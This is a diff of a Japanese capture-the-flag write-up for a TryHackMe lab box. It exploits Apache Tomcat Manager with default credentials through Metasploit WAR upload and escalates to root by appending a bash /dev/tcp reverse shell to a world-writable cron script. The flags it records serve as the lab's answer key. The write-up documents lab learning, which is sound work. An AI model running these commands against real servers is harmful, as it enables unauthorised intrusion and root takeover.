@@ -2,13 +2,14 @@
 tags: [hacking, box, writeup]
 platform: TryHackMe
 difficulty: Easy
-status: in-progress
+status: completed
 date: 2026-03-27
 skills:
   - Ghostcat (CVE-2020-1938)
   - AJP13
   - Apache Tomcat
-  - Tomcat Manager
+  - Tomcat Manager WAR Upload RCE
+  - Cron Job Hijacking
 ---
 
 # bsidesgtthompson
@@ -98,32 +99,83 @@ curl -u "tomcat:s3cret" http://<TARGET_IP>:8080/manager/html
 
 ## 侵入 / Initial Access
 
-### 方針: Tomcat Manager から WAR ファイルアップロード → RCE
+### Tomcat Manager WAR Upload → RCE
 
-Tomcat Manager にログイン成功したため、悪意のある `.war` ファイルをデプロイしてリバースシェルを取得する。
+```bash
+# Metasploit で WAR 生成・アップロード・実行を自動化
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS <TARGET_IP>
+set RPORT 8080
+set HttpUsername tomcat
+set HttpPassword s3cret
+set LHOST <自分のIP>
+set LPORT 4444
+set PAYLOAD java/shell_reverse_tcp
+run
+```
 
-> ※ 作業中
+**結果**: `uid=1001(tomcat) gid=1001(tomcat)` でシェル取得
+
+**ユーザーフラグ**: `39400c90bc683a41a8935e4719f181bf`
+場所: `/home/jack/user.txt`
 
 ---
 
 ## 権限昇格 / Privilege Escalation
 
-> ※ 未着手
+### Cron Job Hijacking
+
+crontab にrootが実行するスクリプトを発見：
+
+```bash
+cat /etc/crontab
+# *  *  * * *  root  cd /home/jack && bash id.sh
+```
+
+`id.sh` のパーミッションを確認：
+
+```
+-rwxrwxrwx 1 jack jack 26 Aug 14 2019 id.sh
+```
+
+**全員が書き込み可能！** リバースシェルを追記：
+
+```bash
+echo 'bash -i >& /dev/tcp/<自分のIP>/4451 0>&1' >> /home/jack/id.sh
+```
+
+ncリスナーで待機（cronが1分以内に実行）：
+
+```bash
+# Metasploit handler
+use exploit/multi/handler
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST <自分のIP>
+set LPORT 4451
+run
+```
+
+**結果**: `uid=0(root) gid=0(root) groups=0(root)` で root シェル取得
+
+**ルートフラグ**: `d89d5391984c0450a95497153ae7ca3a`
+場所: `/root/root.txt`
 
 ---
 
 ## 習得スキル・学び
 
-- AJP13プロトコルの役割と危険性
+- AJP13プロトコルの役割と危険性（外部公開は危険）
 - Ghostcat (CVE-2020-1938) の仕組みと限界（アプリ内ファイルのみ読み取り可能）
 - Tomcat Manager の 401 エラーページにデフォルト認証情報のヒントが含まれる場合がある
 - Tomcat Manager へのアクセスは WAR デプロイによる RCE に直結する
+- Cron Job Hijacking: root実行スクリプトのパーミッションが甘い場合に権限昇格可能
 
 ## ハマったポイント
 
-- Ghostcatで `tomcat-users.xml` を取得しようとしたが WEB-INF 外のため失敗
-- Metasploit の `tomcat_mgr_login` でブルートフォースするも `tomcat:s3cret` が未ヒット → 401ページを手動確認してヒントを発見
+- GhostcatでXML以外のファイル（`tomcat-users.xml`）は WEB-INF 外のため取得不可
+- Metasploit の `tomcat_mgr_login` ブルートフォースでは `s3cret` がヒットしなかった → 401ページを手動確認してヒントを発見
+- Metasploit の非対話モードではセッション操作に工夫が必要（`sessions -c` コマンド活用）
 
 ## 参考にしたリソース
 
--
+- [Ghostcat CVE-2020-1938](https://www.exploit-db.com/exploits/48143)
